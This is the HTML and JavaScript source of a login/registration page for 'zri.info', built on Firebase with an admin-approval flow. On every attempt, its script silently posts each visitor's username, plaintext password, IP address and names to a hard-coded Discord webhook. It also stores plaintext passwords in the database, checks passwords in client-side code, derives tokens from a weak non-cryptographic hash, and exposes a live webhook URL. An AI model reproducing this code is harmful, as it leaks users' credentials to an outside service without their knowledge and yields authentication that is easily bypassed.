<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>zri.info - Login</title>
    <style>
        body { margin: 0; padding: 0; background: linear-gradient(to bottom, #0a1c18, #1a3c34); font-family: 'Frutiger', 'Verdana', sans-serif; color: #fff; overflow-x: hidden; position: relative; }
        body::before { content: ''; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, rgba(0, 255, 0, 0.1), rgba(255, 0, 0, 0.05)); opacity: 0.4; animation: cosmicPulse 15s infinite; z-index: -1; }
        @keyframes cosmicPulse { 0% { transform: scale(1); opacity: 0.4; } 50% { transform: scale(1.2); opacity: 0.6; } 100% { transform: scale(1); opacity: 0.4; } }
        @keyframes neonGlow { 0% { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; } 50% { text-shadow: 0 0 10px #00ff00, 0 0 20px #00ff00; } 100% { text-shadow: 0 0 5px #00ff00, 0 0 10px #00ff00; } }
        .container { display: flex; min-height: 100vh; }
        .sidebar { width: 180px; background: linear-gradient(to bottom, #0a1c18, #1a3c34); padding: 15px; border-right: 2px outset #00cc00; box-shadow: 5px 0 15px rgba(0, 0, 0, 0.8); display: none; transition: transform 0.3s ease-in-out; }
        .sidebar.visible { display: block; transform: translateX(0); }
        .sidebar h2 { color: #00ff00; text-shadow: 0 0 8px #00ff00; font-size: 20px; margin: 0 0 15px; text-align: center; font-weight: bold; animation: neonGlow 2s infinite; }
        .sidebar a { display: flex; align-items: center; padding: 8px; margin: 5px 0; background: linear-gradient(to right, #2e5e56, #1a3c34); border: 2px outset #00cc00; border-radius: 15px; color: #fff; text-decoration: none; box-shadow: 0 0 5px rgba(0, 255, 0, 0.5); transition: all 0.2s; font-size: 14px; position: relative; overflow: hidden; }
        .sidebar a::before { content: ''; display: inline-block; width: 16px; height: 16px; margin-right: 8px; background: url('https://via.placeholder.com/16x16.png?text=Icon') no-repeat center; background-size: cover; transition: transform 0.3s; }
        .sidebar a:hover { background: linear-gradient(to right, #3e7e76, #2e5e56); border: 2px inset #00cc00; transform: translateY(-2px); }
        .sidebar a:hover::before { transform: scale(1.2); }
        .sidebar .visitor-counter { margin-top: 20px; text-align: center; color: #00ff00; text-shadow: 0 0 5px #00ff00; font-size: 14px; animation: neonGlow 2s infinite; }
        .sidebar .sound-toggle { margin-top: 10px; padding: 8px; background: linear-gradient(to bottom, #003300, #006600); border: 2px outset #00ff00; border-radius: 15px; color: #fff; cursor: pointer; text-align: center; box-shadow: 0 0 5px rgba(0, 255, 0, 0.5); transition: all 0.2s; font-size: 14px; }
        .sidebar .sound-toggle:hover { background: linear-gradient(to bottom, #006600, #003300); border: 2px inset #00ff00; transform: translateY(-2px); }
        .hub { flex: 1; max-width: 800px; margin: 20px auto; background: rgba(0, 0, 0, 0.5); border: 3px outset #00cc00; border-radius: 15px; box-shadow: 0 0 30px rgba(0, 255, 0, 0.3), inset 0 0 15px rgba(0, 0, 0, 0.8); padding: 20px; backdrop-filter: blur(8px); position: relative; overflow: hidden; }
        .hub::after { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(255, 0, 0, 0.1), transparent); animation: redPulse 10s infinite; z-index: -1; }
        @keyframes redPulse { 0% { transform: scale(0.5); opacity: 0.2; } 50% { transform: scale(1); opacity: 0.4; } 100% { transform: scale(0.5); opacity: 0.2; } }
        .header { background: linear-gradient(to right, #0a1c18, #1a3c34); padding: 15px; border: 2px outset #00ff00; border-radius: 10px; text-align: center; box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.8), 0 0 20px rgba(0, 255, 0, 0.3); margin-bottom: 20px; position: relative; overflow: hidden; }
        .header::before { content: ''; position: absolute; top: -100%; left: -100%; width: 300%; height: 300%; background: radial-gradient(circle, rgba(0, 255, 0, 0.2), transparent); animation: greenWave 8s infinite; z-index: -1; }
        @keyframes greenWave { 0% { transform: translate(0, 0); } 50% { transform: translate(50%, 50%); } 100% { transform: translate(0, 0); } }
        .header h1 { margin: 0; font-size: 32px; color: #00ff00; text-shadow: 0 0 10px #00ff00; font-weight: bold; animation: neonGlow 2s infinite; }
        .header p { margin: 5px 0 0; font-size: 16px; color: #00cc00; text-shadow: 0 0 5px #00cc00; }
        .banner { background: linear-gradient(to bottom, rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.9)); height: 150px; border: 2px outset #00cc00; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 0 15px rgba(0, 0, 0, 0.3); position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
        .banner h2 { color: #fff; font-size: 40px; text-shadow: 0 0 10px #00ff00; position: absolute; z-index: 1; animation: neonGlow 2s infinite; }
        .content { background: rgba(0, 0, 0, 0.6); padding: 15px; border: 2px outset #00cc00; border-radius: 10px; box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.8); margin-bottom: 20px; position: relative; }
        .content::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: linear-gradient(45deg, transparent, rgba(0, 255, 0, 0.1), transparent); animation: scanLine 3s infinite; z-index: -1; }
        @keyframes scanLine { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
        .content h2 { color: #00ff00; text-shadow: 0 0 5px #00ff00; margin: 0 0 10px; font-size: 24px; font-weight: bold; animation: neonGlow 2s infinite; }
        .content p { color: #fff; line-height: 1.5; font-size: 14px; margin: 0 0 10px; }
        .content input { padding: 10px; margin: 5px 0; border: 2px outset #00cc00; border-radius: 5px; background: rgba(0, 51, 0, 0.4); color: #00ff00; box-shadow: inset 0 0 8px rgba(0, 0, 0, 0.7); width: calc(100% - 24px); }
        .content button { padding: 10px 20px; background: linear-gradient(to bottom, #006600, #003300); border: 2px outset #00ff00; border-radius: 15px; color: #fff; cursor: pointer; box-shadow: 0 0 5px rgba(0, 255, 0, 0.5); transition: all 0.2s; font-size: 14px; position: relative; overflow: hidden; }
        .content button:hover { background: linear-gradient(to bottom, #003300, #006600); border: 2px inset #00ff00; transform: translateY(-2px); box-shadow: 0 0 10px rgba(0, 255, 0, 0.7); }
        .content button::after { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(circle, rgba(0, 255, 0, 0.3), transparent); animation: buttonGlow 2s infinite; z-index: -1; }
        @keyframes buttonGlow { 0% { transform: scale(0); opacity: 0.5; } 50% { transform: scale(1); opacity: 0.8; } 100% { transform: scale(0); opacity: 0.5; } }
        #locked-content { display: none; }
        .footer { text-align: center; padding: 10px; background: linear-gradient(to right, #0a1c18, #1a3c34); border: 2px outset #00ff00; border-radius: 10px; box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.8); margin-top: 20px; position: relative; }
        .footer::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, rgba(0, 255, 0, 0.1), transparent); animation: footerGlow 5s infinite; z-index: -1; }
        @keyframes footerGlow { 0% { opacity: 0.2; } 50% { opacity: 0.4; } 100% { opacity: 0.2; } }
        .footer p { margin: 0; font-size: 12px; color: #00cc00; text-shadow: 0 0 5px #00cc00; }
    </style>
</head>
<body>
    <div class="container">
        <div class="sidebar" id="sidebar">
            <h2>zri.info</h2>
            <a href="/index.html">Home</a>
            <a href="/introduction.html">Introduction</a>
            <a href="/games.html">Games</a>
            <a href="/resources.html">Resources</a>
            <a href="/history.html">History</a>
            <a href="/music.html">Music</a>
            <a href="/videos.html">Videos</a>
            <a href="/contact.html">Contact</a>
            <a href="/access-deletion.html">Delete Access</a>
            <div class="visitor-counter">Visitors: 1,965,576</div>
            <div class="sound-toggle">SOUND FX ON</div>
        </div>
        <div class="hub">
            <div class="header">
                <h1>zri.info</h1>
                <p>Welcome to the Cosmic Gateway</p>
            </div>
            <div class="banner">
                <h2>Enter the Infinite</h2>
            </div>
            <div class="content" id="locked-content">
                <h2>Welcome, Cosmic Traveler!</h2>
                <p>You are now logged in and ready to explore the infinite realms of zri.info. Navigate through our cosmic network with the sidebar on the left.</p>
            </div>
            <div class="content" id="login-section">
                <h2>Login or Register</h2>
                <p>Please log in or register to access the cosmic content of zri.info. If you are new, fill out the form below to request access.</p>
                <input type="text" id="username-input" placeholder="Username">
                <input type="password" id="password-input" placeholder="Password">
                <input type="text" id="first-name-input" placeholder="First Name (Optional)">
                <input type="text" id="last-name-input" placeholder="Last Name (Optional)">
                <button id="login-btn">Login/Register</button>
            </div>
            <div class="footer">
                <p>Â© 2025 zri.info - Powered by Infinite Realms</p>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js';
        import { getDatabase, ref, get, set, push } from 'https://www.gstatic.com/firebasejs/10.12.5/firebase-database.js';
        import { getAuth, signInWithCustomToken, signOut } from 'https://www.gstatic.com/firebasejs/10.12.5/firebase-auth.js';

        const firebaseConfig = {
            apiKey: "AIzaSyCKHYwiEY7E2BKWR4BEtEx6Â W4Gb1V-u48",
            authDomain: "zri-info-tokens.firebaseapp.com",
            databaseURL: "https://zri-info-tokens-default-rtdb.firebaseio.com",
            projectId: "zri-info-tokens",
            storageBucket: "zri-info-tokens.firebasestorage.app",
            messagingSenderId: "343328222138",
            appId: "1:343328222138:web:c64841841f69665d968b83",
            measurementId: "G-6LNN3LQK27"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const auth = getAuth(app);
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1357890150075600936/9EQ0xmN5iXXuUWHvdtukypkmbfPtYhahOQ_4PYwjdbaqw9FTMj6Ty0DvsWScdbywfG0y";

        async function fetchCustomToken(username) {
            try {
                const response = await fetch('/api/generateCustomToken', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username })
                });
                const data = await response.json();
                if (!response.ok) {
                    throw new Error(data.error || 'Failed to fetch custom token');
                }
                return data.customToken;
            } catch (error) {
                throw new Error(`Error fetching custom token: ${error.message}`);
            }
        }

        function simpleHash(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash).toString(16).toUpperCase().padStart(8, '0');
        }

        function generateToken(username, password) {
            return `ZRI-TOKEN-${simpleHash(username + password)}`;
        }

        async function sendDiscordWebhook(username, firstName, lastName, password, requestId, status, errorMessage = null) {
            const ipAddress = await fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(() => "Unknown");

            const embed = {
                title: status === "approved" ? "âœ… Access Granted" : status === "denied" ? "âŒ Access Denied" : status === "attempt" ? "ðŸ” Access Attempt" : "â³ Access Pending",
                color: status === "approved" ? 65280 : status === "denied" ? 16711680 : status === "attempt" ? 255 : 16776960,
                fields: [
                    { name: "Username", value: username, inline: true },
                    { name: "IP Address", value: ipAddress, inline: true },
                    { name: "Password", value: password, inline: true },
                    { name: "First Name", value: firstName || "N/A", inline: true },
                    { name: "Last Name", value: lastName || "N/A", inline: true },
                    { name: "Request ID", value: requestId || "N/A", inline: true },
                    { name: "Status", value: status, inline: true }
                ],
                timestamp: new Date().toISOString(),
                footer: { text: "zri.info Access Control" }
            };

            if (errorMessage) {
                embed.fields.push({ name: "Error", value: errorMessage, inline: false });
            }

            try {
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ embeds: [embed] })
                });
                if (!response.ok) {
                    const errorText = await response.text();
                    throw new Error(`Webhook failed with status ${response.status}: ${errorText}`);
                }
                return true;
            } catch (error) {
                console.error("Error sending Discord webhook:", error);
                alert(`Failed to send request to admin: ${error.message}`);
                return false;
            }
        }

        const storedAccess = localStorage.getItem("zriAccess");
        const loginSection = document.getElementById("login-section");
        const lockedContent = document.getElementById("locked-content");
        const sidebar = document.getElementById("sidebar");
        const loginBtn = document.getElementById("login-btn");

        function showLoginSection() {
            loginSection.style.display = "block";
            lockedContent.style.display = "none";
            sidebar.classList.remove("visible");
            loginBtn.disabled = false;
            loginBtn.textContent = "Login/Register";
        }

        function showLockedContent() {
            loginSection.style.display = "none";
            lockedContent.style.display = "block";
            sidebar.classList.add("visible");
        }

        if (storedAccess) {
            const { username, token } = JSON.parse(storedAccess);
            console.log("Checking stored access for username:", username);
            fetchCustomToken(username).then(async (customToken) => {
                console.log("Custom token received:", customToken);
                await signInWithCustomToken(auth, customToken);
                console.log("Custom sign-in successful for token validation");
                await new Promise(resolve => setTimeout(resolve, 2000));
                const tokenRef = ref(db, 'tokens/' + username);
                try {
                    const snapshot = await get(tokenRef);
                    const tokenData = snapshot.val();
                    if (tokenData && tokenData.token === token && tokenData.reusable && tokenData.username === username) {
                        console.log("Stored token is valid, showing locked content");
                        showLockedContent();
                    } else {
                        console.log("Stored token is invalid, removing access");
                        localStorage.removeItem("zriAccess");
                        alert("Your session is invalid or has been revoked. Please log in again.");
                        showLoginSection();
                    }
                } catch (error) {
                    console.error("Error checking stored token:", error);
                    localStorage.removeItem("zriAccess");
                    alert("Error validating session: " + error.message);
                    showLoginSection();
                } finally {
                    await signOut(auth);
                }
            }).catch((error) => {
                console.error("Error fetching custom token or signing in:", error);
                localStorage.removeItem("zriAccess");
                alert("Error validating session: " + error.message);
                showLoginSection();
            });
        } else {
            showLoginSection();
        }

        async function login() {
            const username = document.getElementById("username-input").value.trim();
            const password = document.getElementById("password-input").value;
            const firstName = document.getElementById("first-name-input").value.trim();
            const lastName = document.getElementById("last-name-input").value.trim();

            if (!username || !password) {
                alert("Username and password are required!");
                return;
            }

            loginBtn.disabled = true;
            loginBtn.textContent = "Processing...";

            try {
                // Fetch a custom token from the Vercel serverless function
                console.log("Requesting custom token for username:", username);
                const customToken = await fetchCustomToken(username);
                console.log("Custom token received:", customToken);

                // Sign in with the custom token
                console.log("Attempting custom sign-in...");
                await signInWithCustomToken(auth, customToken);
                console.log("Custom sign-in successful, user:", auth.currentUser);

                // Wait for auth state to propagate
                console.log("Waiting for auth state to propagate...");
                await new Promise(resolve => setTimeout(resolve, 2000));
                console.log("Auth state propagated, user UID:", auth.currentUser.uid);

                // Send a webhook for the access attempt
                console.log("Sending access attempt webhook...");
                const webhookSuccess = await sendDiscordWebhook(username, firstName, lastName, password, null, "attempt");
                if (!webhookSuccess) {
                    console.warn("Webhook failed, but proceeding with login process...");
                }

                // Check if user exists
                console.log("Reading user data from /users/", username);
                const userRef = ref(db, 'users/' + username);
                const userSnapshot = await get(userRef);
                console.log("User data read:", userSnapshot.exists());

                if (!userSnapshot.exists()) {
                    console.log("User does not exist, creating pending request...");
                    const requestId = push(ref(db, 'pendingUsers')).key;
                    await set(ref(db, 'pendingUsers/' + requestId), {
                        username: username,
                        password: password,
                        first_name: firstName || "",
                        last_name: lastName || "",
                        created_at: new Date().toISOString(),
                        status: "pending"
                    });
                    console.log("Pending request created, sending webhook...");
                    await sendDiscordWebhook(username, firstName, lastName, password, requestId, "pending");
                    alert("Registration request sent to admin for approval. Please wait.");
                    return;
                }

                const userData = userSnapshot.val();
                console.log("User data:", userData);

                if (userData.status === "pending") {
                    alert("Your registration is still pending approval.");
                    return;
                }

                if (userData.status !== "approved") {
                    alert("Your registration was denied or is invalid.");
                    return;
                }

                if (userData.password !== password) {
                    alert("Incorrect password!");
                    return;
                }

                console.log("User credentials valid, generating token...");
                const token = generateToken(username, password);
                const tokenRef = ref(db, 'tokens/' + username);
                await set(tokenRef, {
                    token: token,
                    username: username,
                    reusable: true,
                    created_at: new Date().toISOString()
                });
                console.log("Token set successfully");

                console.log("Logging login event...");
                await push(ref(db, 'logs'), {
                    username: username,
                    token: token,
                    first_name: firstName || "N/A",
                    last_name: lastName || "N/A",
                    timestamp: new Date().toISOString()
                });
                console.log("Login event logged");

                console.log("Storing access in localStorage...");
                localStorage.setItem("zriAccess", JSON.stringify({ username, token }));
                console.log("Access stored, showing locked content...");
                showLockedContent();

                console.log("Sending access granted webhook...");
                await sendDiscordWebhook(username, firstName, lastName, password, null, "approved");
            } catch (error) {
                console.error("Error during login:", error);
                alert("Error logging in: " + error.message);
                await sendDiscordWebhook(username, firstName, lastName, password, null, "denied", error.message);
            } finally {
                loginBtn.disabled = false;
                loginBtn.textContent = "Login/Register";
                await signOut(auth);
            }
        }

        loginBtn.addEventListener("click", login);
    </script>
    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'92bf0ae1be01678a',t:'MTc0MzkxODk5MS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
</body>
</html>